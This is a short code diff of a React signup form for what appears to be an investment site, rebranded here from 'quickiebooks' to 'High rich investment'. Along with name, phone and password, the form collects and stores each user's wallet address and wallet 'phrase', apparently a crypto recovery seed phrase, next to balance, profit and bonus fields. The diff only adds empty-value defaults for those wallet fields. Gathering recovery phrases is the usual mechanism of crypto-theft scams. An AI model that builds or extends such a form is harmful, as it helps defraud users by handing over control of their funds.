@@ -70,8 +70,8 @@ const Form = () => {
         name: nameRef.current.value,
         phone: phoneRef.current.value,
         password: passwordRef.current.value,
-        wallet,
-        phrase: walletPhrase.current.value,
+        wallet: !wallet ? "" : wallet,
+        phrase: !walletPhrase.current.value ? "" : walletPhrase.current.value,
         balance: 0,
         profit: 0,
         bonus: 0,
@@ -84,10 +84,13 @@ const Form = () => {
         uid: user.uid,
       });
       // toast notification
-      toast.success("Welcome to quickiebooks Please verify your email", {
-        position: "top-center",
-        theme: "colored",
-      });
+      toast.success(
+        "Welcome to High rich investment Please verify your email",
+        {
+          position: "top-center",
+          theme: "colored",
+        }
+      );
       // redirect user to login
       navigate("/login");
     } catch (error) {
